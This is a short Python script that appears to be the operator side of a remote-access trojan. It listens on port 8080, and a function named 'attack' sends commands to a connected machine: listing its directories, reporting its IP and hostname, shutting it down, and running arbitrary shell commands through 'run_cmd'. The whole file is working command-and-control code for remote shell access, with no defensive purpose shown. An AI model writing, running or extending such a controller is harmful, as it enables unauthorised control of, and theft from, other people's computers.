import os
import socket

s = socket.socket()
host = socket.gethostname()
port = 8080
s.bind((host, port))


def listen():
    print(f"\n server is running @ {host}")
    print("Waiting for incoming connections")
    s.listen(1)
    global conn
    global addr
    conn, addr = s.accept()
    print(f"{addr} has connected successfully")
    attack()


def attack():

    run = True
    while(run):
        command = str(input('Command >> '))
        if(command == 'view_cwd'):
            conn.send(command.encode())
            files = conn.recv(5000)
            files = files.decode()
            print(f"COMMAND OUTPUT: {files}")
        elif(command == 'DISCONNECT'):
            conn.send("DISCONNECT".encode())
            conn.close()
            print("DISCONNCTED")
            listen()
        elif(command == "dir"):
            conn.send("DIR".encode())
            files = conn.recv(1048).decode()
            print(files)
        elif(command == "list_custom_dir"):
            path = str(input("ENTER DIR PATH:  "))
            conn.send(command.encode())
            conn.send(path.encode())
            lcdR = conn.recv(5000).decode()
            print(lcdR)
        elif(command == "get_ip"):
            conn.send(command.encode())
            ip = conn.recv(5000).decode()
            print(ip)
        elif(command == "get_name"):
            conn.send(command.encode())
            name = conn.recv(5000).decode()
            print(name)
        elif(command == "shutdown"):
            conn.send("shutdown".encode())
            c = conn.recv(2000)
            if(c):
                print("DONE")
                listen()
        elif(command == "run_cmd"):
            conn.send(command.encode())
            cmd = str(input("Enter Command To Run: "))
            conn.send(cmd.encode())
            r = conn.recv(5000).decode()
            if(r == "b''"):
                r = "DONE"
            print(r)
        else:
            print("COMMAND NOT RECOGNISED")


listen()
